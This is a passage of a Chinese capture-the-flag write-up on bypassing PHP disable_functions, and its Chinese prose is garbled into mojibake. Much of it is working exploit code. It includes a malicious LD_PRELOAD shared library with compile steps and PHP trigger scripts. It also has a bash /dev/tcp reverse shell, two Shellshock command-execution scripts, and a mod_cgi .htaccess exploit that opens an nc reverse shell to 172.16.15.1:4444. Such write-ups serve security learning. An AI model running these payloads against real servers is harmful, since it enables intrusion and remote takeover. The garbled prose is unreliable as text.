ï¼Œç„¶åå†ç”¨ä¸€ä¸ªphpçš„è„šæœ¬æ¥æ¿€æ´»å¹¶è¾¾åˆ°åå¼¹shellçš„ç›®çš„ã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€æ”¯æŒputenv 2ã€æ”¯æŒmailã€imap_mailã€mb_send_mailæˆ–error_log 3ã€å­˜åœ¨å¯å†™çš„ç›®å½•ï¼Œéœ€è¦ä¸Šä¼ .soæ–‡ä»¶ bypassæµç¨‹ 1ã€åœ¨Linuxä¸‹ç”Ÿæˆå«æœ‰æ¶æ„ä»£ç çš„åŠ¨æ€é“¾æ¥ç¨‹åº 2ã€é€šè¿‡phpè„šæœ¬åˆ©ç”¨putenvæ¥è®¾ç½®LD_PRELOADï¼Œä½¿å¾—ä¼˜å…ˆè°ƒç”¨æˆ‘ä»¬æ„é€ çš„æ¶æ„åŠ¨æ€é“¾æ¥ç¨‹åº 3ã€é€šè¿‡ä¸Šè¿°çš„phpè„šæœ¬è§¦å‘æ¶æ„ä»£ç ï¼Œä»¥è¾¾åˆ°åå¼¹shellçš„ç›®çš„ é¦–å…ˆï¼Œæ„é€ çš„åŠ¨æ€é“¾æ¥ç¨‹åºçš„ä»£ç å¦‚ä¸‹ï¼š #include &lt;stdlib.h&gt;__attribute__((constructor)) void Z2diMG4=(){ unsetenv(\"LD_PRELOAD\"); if (getenv(\"cmd\") != NULL){ system(getenv(\"cmd\")); } else{ system(\"echo 'Hello' &gt; /hackfile\"); }} æ„é€ phpè§¦å‘è„šæœ¬ï¼š è¿™é‡Œå¸¸ç”¨çš„æœ‰ä¸¤ç§æ–¹å¼ï¼šSendmail+LD_PRELOADå’Œerror_log+LD_PRELOADï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰ç¦æ­¢mailçš„ä½¿ç”¨ï¼Œå°±å¯ä»¥ç”¨å‰è€…ï¼Œåä¹‹å¯ä»¥ä½¿ç”¨åè€…ã€‚ Sendmail+LD_PRELOADï¼šsendmailä¼šè°ƒç”¨geteuid()ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒåŠ«æŒï¼Œè¯¦ç»†çŸ¥è¯†å‚è€ƒè¿™é‡Œã€‚ è§¦å‘è„šæœ¬å¦‚ä¸‹ï¼š &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\",\"\",\"\",\"\",\"\");?&gt; å°†soæ–‡ä»¶ä¼ åˆ°/tmpæ–‡ä»¶å¤¹æ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶å¤¹ç”¨æˆ·æ˜¯å¯ä»¥è¿›è¡Œå†™å…¥çš„ï¼Œè‡ªå·±ä¹Ÿå¯ä»¥æ‰¾åˆ«çš„æ–‡ä»¶å¤¹æ¥çµæ´»æ„é€ ã€‚ error_log+LD_PRELOADï¼šå½“é¢˜ç›®ç¯å¢ƒä¸æ”¯æŒmailçš„æ—¶å€™ï¼Œå³å¯åˆ©ç”¨error_logæ¥è§¦å‘åŠ«æŒï¼Œæœ¬é¢˜å°±éœ€è¦ç”¨è¿™ç§æ–¹æ³•ã€‚ è§¦å‘è„šæœ¬å¦‚ä¸‹ï¼š &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); error_log(\"a\",1); mail(\"a@localhost\",\"\",\"\",\"\",\"\");?&gt; å¦å¤–å½“é¢˜ç›®ç¯å¢ƒå­˜åœ¨gnupgæ‹“å±•çš„æ—¶å€™è¿˜å¯ä»¥åˆ©ç”¨phpçš„gnupg_init()å‡½æ•°æ¥è§¦å‘ï¼Œå¯ä»¥åœ¨phpinfoä¸­çœ‹åˆ°ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); gnupg_init();?&gt; æ³¨æ„ä¸Šé¢è„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤æ˜¯å°†lsæ‰§è¡Œçš„ç»“æœé‡å®šå‘åˆ°hackfileä¸­æ¥æŸ¥çœ‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹çš„ä»£ç æ¥æ‹¿åˆ°shellï¼š &lt;?php putenv(\"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\",\"\",\"\",\"\",\"\");?&gt; è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œæºç ä¸­ç»™äº†éƒ¨åˆ†æºç ï¼š æºç ä¸­æç¤ºå·²ç»å­˜åœ¨å°é©¬äº†ï¼Œä¸”ç§˜é’¥æ˜¯antï¼Œç›´æ¥æ‹¿åˆ°èšå‰‘é‡Œè¿æ¥èƒ½è¿ä¸Šï¼Œä½†æ˜¯flagæ–‡ä»¶æ— æ³•è®¿é—®ï¼Œå¼€ç»ˆç«¯ä¹Ÿæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š è‚¯å®šæ˜¯systemè¢«banäº†ï¼Œéœ€è¦è¿›è¡Œfunctions_disableçš„bypassã€‚ æœ‰ä¸¤ç§æ–¹æ³•ï¼šåˆ©ç”¨èšå‰‘è‡ªå¸¦çš„æ’ä»¶æˆ–è€…è‡ªå·±æ‰‹å·¥bypass åˆ©ç”¨èšå‰‘æ’ä»¶ è¿™ä¸ªæœ‰è¦æ±‚ï¼šè‡ªå·±çš„ç¯å¢ƒå¿…é¡»æ˜¯Linuxçš„ï¼Œå› ä¸ºå®ƒè¦ç”¨gccå»ç¼–è¯‘soæ–‡ä»¶ã€‚ è¿™ä¸ªè¦æ±‚æ»¡è¶³ä¹‹åä¾¿å¯ä»¥åœ¨æ’ä»¶å¸‚åœºä¸­ä¸‹è½½functions_disablebypassçš„æ’ä»¶ï¼Œç„¶åé€‰æ‹©LD_PRELOADè¿›è¡Œbypasså°±è¡Œäº†ã€‚ è¿™é‡Œæœ‰å®˜æ–¹è¯¦è§£ æ‰‹åŠ¨bypass é¦–å…ˆåˆ©ç”¨å‰é¢æåˆ°çš„Cä»£ç ï¼Œåˆ©ç”¨ä¸‹é¢ä¸¤æ¡å‘½ä»¤ç”Ÿæˆsoæ–‡ä»¶ï¼š gcc -c -fPIC ld_preload.c -o ld_preloadgcc --share ld_preload -o ld_preload.so åŒæ—¶ç”¨ä¸Šè¿°çš„ä»£ç æ„é€ å¥½è§¦å‘çš„phpè„šæœ¬ï¼š &lt;?php //putenv(\"cmd=ls &gt; hackfile\"); putenv(\"cmd=/readflag &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/ld_preload.so\"); error_log(\"a\",1); mail(\"a@localhost\",\"\",\"\",\"\",\"\");?&gt; æŠŠsoæ–‡ä»¶ä¸Šä¼ åˆ°/tmp/æ–‡ä»¶å¤¹ä¸‹ï¼Œè§¦å‘è„šæœ¬ä¸Šä¼ åˆ°/var/www/html/ä¸‹ ç„¶ååœ¨æµè§ˆå™¨è®¿é—®æˆ‘ä»¬å†™å…¥çš„è§¦å‘è„šæœ¬ï¼Œç„¶åå›åˆ°èšå‰‘æŸ¥çœ‹æ•ˆæœï¼š å¯ä»¥çœ‹åˆ°hackfileæ–‡ä»¶å·²ç»å­˜åœ¨äº†ï¼Œæ‰“å¼€å³å¯æ‹¿åˆ°flag å…³äºè¿™ç§bypasså§¿åŠ¿ï¼Œç½‘ä¸Šå¾ˆå¤šï¼Œä»¥ä¸‹å‡ ä¸ªå†™çš„å…¨é¢ä¸€äº›ï¼šhttps://www.freebuf.com/articles/web/192052.htmlhttps://www.dazhuanlan.com/2020/01/06/5e128867c6c74/ ShellShockä¸»è¦è€ƒå¯Ÿåˆ©ç”¨bashç ´å£³æ¼æ´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œfunctions_disableçš„bypass å…³äºåˆ©ç”¨ShellShock bypass è¯¥å§¿åŠ¿ä¸»è¦æ˜¯å€ŸåŠ©äº†bashç ´å£³ï¼ˆCVE-2014-6271ï¼‰æ¼æ´ï¼Œç›´æ¥å¯¼è‡´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨mail()å‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç»•è¿‡disable_functionsã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€æ”¯æŒputenv 2ã€æ”¯æŒmailã€imap_mailã€mb_send_mailæˆ–error_log 3ã€/bin/bash å­˜åœ¨ CVE-2014-6271 æ¼æ´ 4ã€/bin/sh -&gt; /bin/bash sh é»˜è®¤çš„ shell æ˜¯ bash bypassæµç¨‹ 1ã€ç¼–å†™shellshockåˆ©ç”¨è„šæœ¬å¹¶ä¸Šä¼  2ã€æµè§ˆå™¨è®¿é—®ä¸Šä¼ çš„è„šæœ¬è¿›è¡Œåå¼¹shell åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ç‰ˆè„šæœ¬ä»£ç ï¼š //èšå‰‘æä¾›çš„&lt;?phpfunction runcmd($c){ $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); if(substr($d, 0, 1) == \"/\" &amp;&amp; function_exists('putenv') &amp;&amp; (function_exists('error_log') || function_exists('mail'))){ if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){ $tmp=tempnam(sys_get_temp_dir(), 'as'); putenv(\"PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1\"); if (function_exists('error_log')) { error_log(\"a\", 1); }else{ mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\"); } }else{ print(\"Not vuln (not bash)\\n\"); } $output = @file_get_contents($tmp); @unlink($tmp); if($output!=\"\"){ print($output); }else{ print(\"No output, or not vuln.\"); } }else{ print(\"ä¸æ»¡è¶³ä½¿ç”¨æ¡ä»¶\"); }}// runcmd(\"whoami\"); // è¦æ‰§è¡Œçš„å‘½ä»¤runcmd($_REQUEST[\"cmd\"]); // ?cmd=whoami?&gt; ä»¥åŠä¸‹é¢è¿™ä¸ªï¼š &lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(\".\",\"data\"); putenv(\"PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1\"); // In Safe Mode, the user may only alter environment variableswhose names // begin with the prefixes supplied by this directive. // By default, users will only be able to set environment variablesthat // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, // PHP will let the user modify ANY environment variable! mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actuallysend any mail $output = @file_get_contents($tmp); @unlink($tmp); if($output != \"\") return $output; else return \"No output, or not vuln.\"; } echo shellshock($_REQUEST[\"cmd\"]); ?&gt; ç„¶åé€šè¿‡èšå‰‘ä¸Šä¼ çš„webç›®å½•å¹¶è®¿é—®ï¼Œä¸å‡ºé—®é¢˜å³å¯é€šè¿‡cmdä¼ å‚æ‰§è¡Œå‘½ä»¤ã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®è¿˜æ˜¯é‚£ä¸ªé¡µé¢ï¼š ä¸Šèšå‰‘ï¼ŒåŒæ ·ä¸èƒ½é€šè¿‡ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹ä¸€ä¸‹phpinfoï¼š å‘ç°æ˜¯PHP5+ç‰ˆæœ¬ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨shellshockè¿›è¡Œbypassï¼Œä¸¤ç§æ–¹å¼ï¼šèšå‰‘æ’ä»¶ or æ‰‹å·¥â€¦ åˆ©ç”¨èšå‰‘æ’ä»¶å‚è€ƒè¿™é‡Œã€‚ æ‰‹å·¥bypassåˆ©ç”¨ä¸Šè¿°ä»£ç æ„é€ expè„šæœ¬ï¼Œä¸Šä¼ å¹¶è®¿é—®ï¼Œå³å¯æ‹¿åˆ°shellï¼Œé€šè¿‡æ§åˆ¶cmdå‚æ•°å†…å®¹æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ è¯è¯´ï¼Œæˆ‘åšè¿™é¢˜çš„æ—¶å€™è¿™æ ·ç”¨æ²¡æˆåŠŸâ€¦åæ¥ç”¨l3m0nå¸ˆå‚…çš„è„šæœ¬æ‰“é€šçš„â€¦ è¿™é‡Œæä¸€ä¸‹l3m0nå¸ˆå‚…è„šæœ¬ä¸­çš„FUZZè„šæœ¬(å°±æ˜¯é‚£ä¸ªåä¸ºshell.phpçš„è„šæœ¬)ï¼Œä¸Šä¼ è¿™ä¸ªè„šæœ¬åˆ°webæ–‡ä»¶å¤¹ä¸‹ï¼Œè®¿é—®å³å¯FUZZå‡ºå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼š ç„¶åå€ŸåŠ©äº†apache_mod_cgiçš„è§£é¢˜æ–¹å¼æœ€ç»ˆæ‹¿åˆ°çš„flagã€‚ å¯å‚è€ƒï¼šhttps://www.secpulse.com/archives/2300.html Apache Mod CGIä¸»è¦è€ƒå¯Ÿåˆ©ç”¨apache mod_cgiæ¨¡å—ç»“åˆ.htaccesså¯¹functions_disableè¿›è¡Œbypass å…³äºåˆ©ç”¨Apache_Mod_CGI bypass åœ¨apacheçš„WEBç¯å¢ƒä¸­ï¼Œç»å¸¸ä¼šä½¿ç”¨.htaccessæ¥ç¡®å®šæŸä¸ªç›®å½•ä¸‹çš„URLé‡å†™è§„åˆ™ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›å¼€æºçš„CMSæˆ–è€…æ¡†æ¶å½“ä¸­ç»å¸¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚è‘—åçš„å¼€æºè®ºå›discuz!ï¼Œå°±å¯ä»¥é€šè¿‡.htaccessæ–‡ä»¶å®ç°URLçš„é™æ€åŒ–ï¼Œå¤§éƒ¨åˆ†PHPæ¡†æ¶ï¼Œä¾‹å¦‚ThinkPHPå’ŒLaravelï¼Œåœ¨apacheç¯å¢ƒä¸‹ä¼šç”¨.htaccessæ–‡ä»¶å®ç°è·¯ç”±è§„åˆ™ã€‚ä½†æ˜¯å¦‚æœ.htaccessæ–‡ä»¶è¢«æ”»å‡»è€…ä¿®æ”¹çš„è¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨apacheçš„mod_cgiæ¨¡å—ï¼Œç›´æ¥ç»•è¿‡PHPçš„ä»»ä½•é™åˆ¶ï¼Œæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€Linux æ“ä½œç³»ç»Ÿ 2ã€Apache +PHP (apache ä½¿ç”¨apache_mod_php) 3ã€Apache å¼€å¯äº† cgi, rewrite 4ã€Web ç›®å½•ç»™äº† AllowOverride æƒé™ bypassæµç¨‹ 1ã€phpinfoæŸ¥çœ‹æœåŠ¡ç«¯çš„é…ç½®æ˜¯å¦æ”¯æŒcgi 2ã€é…ç½®.htaccessæ–‡ä»¶å¹¶ä¸Šä¼  3ã€ä¸Šä¼ åå¼¹shellçš„æ–‡ä»¶ é…ç½®.htaccessæ–‡ä»¶å¦‚ä¸‹(å‚è€ƒèšå‰‘ç»™å‡ºçš„ç­–ç•¥)ï¼š Options +ExecCGIAddHandler cgi-script .ant åå¼¹shellæ–‡ä»¶ä»£ç ï¼š #!/bin/shecho&amp;&amp;cd &quot;/var/www/html&quot;;ls -al;echo [S];pwd;echo [E]//æ³¨æ„æ˜¯.antåç¼€ æœ€åè®¿é—®shell.antå³å¯è¿›è¡Œåå¼¹shellã€‚ è¿™é‡Œä¹Ÿå‚è€ƒäº†l3m0nå¸ˆå‚…githubé‡Œå…³äºbypassçš„è„šæœ¬ï¼Œè¯¦ç»†å®Œå¤‡ï¼Œå­¦åˆ°å¾ˆå¤šã€‚ &lt;?php$cmd = \"nc -c '/bin/bash' 172.16.15.1 4444\"; //command to be executed$shellfile = \"#!/bin/bash\\n\"; //using a shellscript$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a 500 error is thrown when there is output$shellfile .= \"$cmd\"; //executing $cmdfunction checkEnabled($text, $condition, $yes, $no) //this surely can be shorter{ echo \"$text: \" . ($condition ? $yes : $no) . \"&lt;br&gt;\\n\";}if (!isset($_GET['checked'])) { @file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked} else { $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled? $writable = is_writable('.'); //current dir writable? $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled? checkEnabled(\"Mod-Cgi enabled\", $modcgi, \"Yes\", \"No\"); checkEnabled(\"Is writable\", $writable, \"Yes\", \"No\"); checkEnabled(\"htaccess working\", $htaccess, \"Yes\", \"No\"); if (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) { echo \"Error. All of the above must be true for the script to work!\"; //abort if not } else { checkEnabled(\"Backing up .htaccess\", copy(\".htaccess\", \".htaccess.bak\"), \"Suceeded! Saved in .htaccess.bak\", \"Failed!\"); //make a backup, cause you never know. checkEnabled(\"Write .htaccess file\", file_put_contents('.htaccess', \"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"), \"Succeeded!\", \"Failed!\"); //.dizzle is a nice extension checkEnabled(\"Write shell file\", file_put_contents('shell.dizzle', $shellfile), \"Succeeded!\", \"Failed!\"); //write the file checkEnabled(\"Chmod 777\", chmod(\"shell.dizzle\", 0777), \"Succeeded!\", \"Failed!\"); //rwx echo \"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;\"; //call the script }}?&gt; æœ¬é¢˜è§£é¢˜çš„æ—¶å€™å°±æ˜¯ç”¨çš„è¿™ä¸ªè„šæœ¬ã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®å¸¸è§„æ“ä½œï¼Œèšå‰‘è¿æ¥ï¼Œæ³¨æ„è¿æ¥çš„æ—¶å€™ç¼–ç å™¨éœ€è¦é€‰æ‹©base64ã€‚åŒæ ·æ˜¯ç»ˆç«¯è¾“å…¥å‘½ä»¤æ— æ•ˆã€‚çœ‹ä¸€ä¸‹phpinfoï¼Œå¯ä»¥å‘ç°ï¼Œæ”¯æŒcgiï¼ŒåŒæ—¶æ ¹æ®é¢˜ç›®æè¿°ï¼Œåˆ©ç”¨cgiè¿›è¡Œbypassï¼Œè¿˜æ˜¯ä¸¤ç§æ–¹å¼ï¼šèšå‰‘bypassæ’ä»¶ or æ‰‹å·¥bypassã€‚ åˆ©ç”¨èšå‰‘æ’ä»¶æ¨¡å¼é€‰æ‹©Apache_mod_cgiå³å¯ï¼Œè¯¦ç»†å‚è€ƒè¿™é‡Œã€‚ æ‰‹å·¥bypasså‰é¢è¯´äº†ï¼Œè¿™é¢˜ç”¨çš„l3m0nå¸ˆå‚…çš„è„šæœ¬ï¼Œç›´æ¥å°†exp.php(å‰é¢è´´çš„ä»£ç )ä¸Šä¼ åˆ°webæ–‡ä»¶å¤¹ï¼Œå¹¶è®¿é—®è¯¥æ–‡ä»¶ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š å†çœ‹èšå‰‘é‡Œçš„æƒ…å†µï¼š å¯ä»¥å‘ç°ï¼Œå¤šäº†å‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­shell.dizzleæ–‡ä»¶é‡ŒåŒ…å«æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ‘ä»¬é€šè¿‡æ›´æ”¹è¯¥æ–‡ä»¶å³å¯æ‹¿åˆ°flag(è¿™é‡Œæ³¨æ„ï¼š/flagæ˜¯644æƒé™ï¼Œwww-dataç”¨æˆ·æ— æ³•é€šè¿‡è¯»æ–‡ä»¶çš„å½¢å¼è¯»åˆ°å†…å®¹, éœ€è¦æ‰§è¡Œæ‹¥æœ‰ SUID æƒé™çš„ tac å‘½ä»¤(å…·ä½“çœ‹ /start.sh)æ¥è·å– flag)ï¼š ç„¶ååœ¨æµè§ˆå™¨è®¿é—®shell.dizzleå³å¯æ‹¿åˆ°flagäº†ã€‚ å¯å‚è€ƒï¼šhttps://www.anquanke.com/post/id/195686 Json Serializer UAFåˆ©ç”¨Jsonåºåˆ—åŒ–ç¨‹åºä¸­çš„å †æº¢å‡ºè¿›è¡Œbypassã€‚ å…³äºåˆ©ç”¨Json_Serializer_UAF bypass PHP-Json-bypassæ¼æ´åˆ©ç”¨jsonåºåˆ—åŒ–ç¨‹åºä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œä»¥ç»•è¿‡functions_disableå¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå½±å“èŒƒå›´æ˜¯Linuxï¼Œphp 7.1-7.3ã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€Linux æ“ä½œç³»ç»Ÿ 2ã€PHP ç‰ˆæœ¬ï¼š7.1 - all versions to dateã€7.2 &lt; 7.2.19 (released: 30 May 2019)ã€7.3 &lt; 7.3.6 (released: 30 May 2019) bypassæµç¨‹ 1ã€æŸ¥çœ‹PHPç‰ˆæœ¬ 2ã€ä¸Šä¼ expæ‰§è¡Œæˆ–è€…åˆ©ç”¨èšå‰‘æ’ä»¶bypass è¿™é‡Œé™„ä¸€ä¸ªç½‘ä¸Šæ‰¾åˆ°å¤§å¸ˆå‚…å†™çš„expã€‚æˆ‘ä»å¸ˆå‚…é‚£é‡Œä¹Ÿforkäº†expçš„åº“ï¼Œå¯åˆ°æˆ‘çš„githubå…±åŒå­¦ä¹ ã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œä»ç„¶ç»™äº†å°é©¬ï¼Œè¿æ¥ä¸Šä»ç„¶æ²¡æœ‰æƒé™ã€‚å¯ä»¥é€‰æ‹©åˆ©ç”¨èšå‰‘æ’ä»¶æˆ–è€…ä¸Šé¢çš„expè¿›è¡Œbypassæ‹¿åˆ°www-dataçš„ç”¨æˆ·æƒé™ã€‚ï¼ˆå†æç¤ºä¸€ä¸‹ï¼šbypassæ’ä»¶åªæœ‰Linuxä¸‹çš„èšå‰‘å¯ç”¨å“¦ï¼‰ åˆ©ç”¨èšå‰‘æ’ä»¶å‚è€ƒå®˜æ–¹çš„wpï¼Œæˆ‘ä»¬æ¥å®ç°ä¸€ä¸‹ã€‚ è¿æ¥ä¸Šä¹‹åï¼Œåœ¨ä¸»é¡µé¢é€‰æ‹©ç»•è¿‡disable_functionsæ’ä»¶ï¼š ç„¶åé€‰æ‹©Json Serializer UAFâ€“&gt;å¼€å§‹bypass ä¹‹åå°±èƒ½æ‹¿åˆ°www-dataæƒé™çš„shelläº†ï¼Œæ³¨æ„è¿™ä¸ªç”¨æˆ·æƒé™ä¸è¶³ä»¥è¯»å–flagï¼Œå› æ­¤catå‘½ä»¤è¯»å–ä¸åˆ°flagï¼Œéœ€è¦ç”¨tacå‘½ä»¤æ¥è¯»å–ï¼š æ‰‹å·¥bypassexpå·²ç»ç»™äº†ï¼Œè‡ªå·±å¯ä»¥å°è¯•ä¸‹ï¼Œè¿™ä¸¤å¤©äº‹æƒ…å¤šï¼Œå‡ ä¸ªé¢˜éƒ½æ˜¯ç”¨èšå‰‘ç§’çš„ã€‚ å‚è€ƒï¼šhttps://www.anquanke.com/post/id/195686#h3-4https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6 PHP-FPMåœ¨æœåŠ¡å™¨æ”¯æŒPHP-FPMçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨PHPçš„å†…æ ¸å˜é‡è¿›è¡Œbypassï¼ŒåŸç†ä¸åˆ©ç”¨LD-PRELOADè¿›è¡Œbypassæ˜¯ä¸€æ ·çš„ã€‚ å…³äºåˆ©ç”¨PHP-FPM bypass Fastcgi æ˜¯ä¸€ç§é€šè®¯åè®®ï¼Œç”¨äºWebæœåŠ¡å™¨ä¸åç«¯è¯­è¨€çš„æ•°æ®äº¤æ¢ï¼›PHP-FPMåˆ™æ˜¯phpç¯å¢ƒä¸­å¯¹Fastcgiåè®®çš„ç®¡ç†ç¨‹åºå®ç°ã€‚ Nginxä¸ºfastcgi æä¾›äº† fastcgi_param æ¥ä¸»è¦å¤„ç†æ˜ å°„å…³ç³»ï¼Œå°† Nginx ä¸­çš„å˜é‡ç¿»è¯‘æˆ PHP èƒ½å¤Ÿç†è§£çš„å˜é‡ã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€PHPå¿…é¡»è¿è¡ŒäºPHP-FPM/FastCGIæ¨¡å¼ä¸‹ 2ã€å†…æ ¸ç‰ˆæœ¬å¿…é¡»å¤§äº2.98 3ã€open_basedir = off bypassæµç¨‹ 1ã€æŸ¥çœ‹phpinfoæ˜¯å¦æ”¯æŒPHP-FPM/FastCGI 2ã€ä¸Šèšå‰‘æ’ä»¶ or exp è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œä¸€å¦‚æ—¢å¾€èšå‰‘è¿æ¥ï¼Œè¿™ä¸ªé¢˜å…¶å®ä¸èšå‰‘åŸç‰ˆæœ‰ç‚¹å‡ºå…¥ï¼Œèšå‰‘é¢˜è§£é‡Œå†™çš„æœ¬é¢˜ç¯å¢ƒæ˜¯æ”¯æŒputenvçš„ï¼Œé‚£å°±å’Œåˆ©ç”¨LD_PRELOADç»•è¿‡å§¿åŠ¿ä¸€æ ·äº†ï¼Œä½†æ˜¯è¯•äº†ï¼Œæ²¡æˆåŠŸï¼Œåæ¥ç”¨èšå‰‘æ’ä»¶çš„æ—¶å€™å‘ç°äº†é—®é¢˜ã€‚ åˆ©ç”¨èšå‰‘æ’ä»¶åƒå‰é¢çš„æ“ä½œä¸€æ ·ï¼šé€‰æ‹©ä¸Šbypassæ’ä»¶ -&gt; é€‰æ‹©æ¨¡å¼ -&gt; FPM/FCGIè¿™ä¸ªæ—¶å€™å‘ç°é—®é¢˜æ‰€åœ¨äº†ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæœ¬é¢˜ç¯å¢ƒå¹¶æ²¡æœ‰putenvï¼Œç”¨LD_PRELOADçš„å§¿åŠ¿èƒ½è¿‡å°±æ€ªäº†â€¦ ç„¶ååœ¨åœ°å€é‡Œé€‰ä¸Šæœ€åä¸€ä¸ªå¹¶å¼€å§‹ï¼š æˆåŠŸæ‰§è¡Œä¹‹åï¼Œè¿æ¥ä¸Šé¢˜ç›®ç¯å¢ƒï¼Œå†åˆ·æ–°ä¸€ä¸‹webç›®å½•çœ‹ä¸€ä¸‹ï¼š å‘ç°å¤šäº†ä¸€ä¸ª.antproxy.phpæ²¡é”™ï¼è¿™å°±æ˜¯èšå‰‘å†™å…¥çš„å¦ä¸€ä¸ªshellæ–‡ä»¶ï¼Œæˆ‘ä»¬å›å»æŠŠè¿æ¥shellçš„urlæ¢æˆè¿™ä¸ªshellæ–‡ä»¶çš„urlï¼Œé“¾æ¥å¯†ç ä¸å˜ï¼Œä¾‹å¦‚ï¼š urlï¼šhttp://change-123456/shell.phpï¼Œè¿æ¥å¯†ç ï¼šcmdæ”¹ä¸ºurlï¼šhttp://change-123456/.antproxy.phpï¼Œè¿æ¥å¯†ç ï¼šcmd å†æ¬¡è¿æ¥å³å¯æ‹¿åˆ°æ‹¥æœ‰www-dataæƒé™çš„shellï¼Œæ³¨æ„æ­¤æ—¶catå‘½ä»¤è¿˜æ˜¯è¯»å–ä¸åˆ°flagçš„ï¼Œéœ€è¦ç”¨tacå‘½ä»¤æ¥æ‹¿åˆ°flag: å‚è€ƒï¼šhttps://www.freebuf.com/articles/web/82801.htmlhttps://www.anquanke.com/post/id/195686#h3-4 GC UAFåˆ©ç”¨GC UAFå¯¼è‡´çš„PHPä»£ç æ‰§è¡Œæ¼æ´è¿›è¡Œbypass å…³äºåˆ©ç”¨GC UAF PHPæ˜¯ä¸€é—¨æ‰˜ç®¡å‹è¯­è¨€ï¼Œåœ¨PHPç¼–ç¨‹ä¸­ç¨‹åºå‘˜ä¸éœ€è¦æ‰‹å·¥å¤„ç†å†…å­˜èµ„æºçš„åˆ†é…ä¸é‡Šæ”¾(ä½¿ç”¨Cç¼–å†™PHPæˆ–Zendæ‰©å±•é™¤å¤–)ï¼Œè¿™å°±æ„å‘³ç€PHPæœ¬èº«å®ç°äº†åƒåœ¾å›æ”¶æœºåˆ¶(Garbage Collection)ã€‚ è¯¥æœºåˆ¶å­˜åœ¨UAFæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œå‘½ä»¤ç­‰ï¼Œä¹Ÿå¯ä»¥å®Œæˆå¯¹functions_disableçš„bypass åˆ©ç”¨æ¡ä»¶ PHPç‰ˆæœ¬æ»¡è¶³ï¼š 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 - all versions to date bypassæµç¨‹ 1ã€æŸ¥çœ‹PHPç‰ˆæœ¬ä¿¡æ¯ 2ã€åˆ©ç”¨èšå‰‘æ’ä»¶ or exp 